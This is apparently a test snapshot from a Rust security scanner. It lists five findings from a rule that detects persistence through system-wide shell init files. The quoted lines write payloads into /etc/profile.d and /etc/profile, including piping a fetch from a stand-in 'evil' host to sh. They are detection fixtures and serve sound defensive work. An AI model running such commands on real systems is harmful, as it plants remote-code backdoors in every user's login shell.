@@ -1,0 +1,61 @@
+---
+source: src/rules/builtin/persistence.rs
+expression: findings
+---
+[
+  {
+    "id": "PS-012",
+    "severity": "critical",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "System-wide shell init persistence",
+    "line": 8,
+    "code": "echo 'curl http://evil|sh' > /etc/profile.d/backdoor.sh",
+    "message": "System-wide shell init persistence detected: a payload is being written to /etc/profile.d/ or /etc/profile, which runs for every user's login shell.",
+    "recommendation": "Artifacts must not write system-wide shell init files. Remove the write and audit /etc/profile.d for planted scripts."
+  },
+  {
+    "id": "PS-012",
+    "severity": "critical",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "System-wide shell init persistence",
+    "line": 9,
+    "code": "cp payload.sh /etc/profile.d/00-init.sh",
+    "message": "System-wide shell init persistence detected: a payload is being written to /etc/profile.d/ or /etc/profile, which runs for every user's login shell.",
+    "recommendation": "Artifacts must not write system-wide shell init files. Remove the write and audit /etc/profile.d for planted scripts."
+  },
+  {
+    "id": "PS-012",
+    "severity": "critical",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "System-wide shell init persistence",
+    "line": 10,
+    "code": "echo 'export EVIL=1' >> /etc/profile",
+    "message": "System-wide shell init persistence detected: a payload is being written to /etc/profile.d/ or /etc/profile, which runs for every user's login shell.",
+    "recommendation": "Artifacts must not write system-wide shell init files. Remove the write and audit /etc/profile.d for planted scripts."
+  },
+  {
+    "id": "PS-012",
+    "severity": "critical",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "System-wide shell init persistence",
+    "line": 11,
+    "code": "tee /etc/profile.d/hook.sh < payload",
+    "message": "System-wide shell init persistence detected: a payload is being written to /etc/profile.d/ or /etc/profile, which runs for every user's login shell.",
+    "recommendation": "Artifacts must not write system-wide shell init files. Remove the write and audit /etc/profile.d for planted scripts."
+  },
+  {
+    "id": "PS-012",
+    "severity": "critical",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "System-wide shell init persistence",
+    "line": 12,
+    "code": "curl http://evil.example/x.sh -o /etc/profile.d/x.sh",
+    "message": "System-wide shell init persistence detected: a payload is being written to /etc/profile.d/ or /etc/profile, which runs for every user's login shell.",
+    "recommendation": "Artifacts must not write system-wide shell init files. Remove the write and audit /etc/profile.d for planted scripts."
+  }
+]
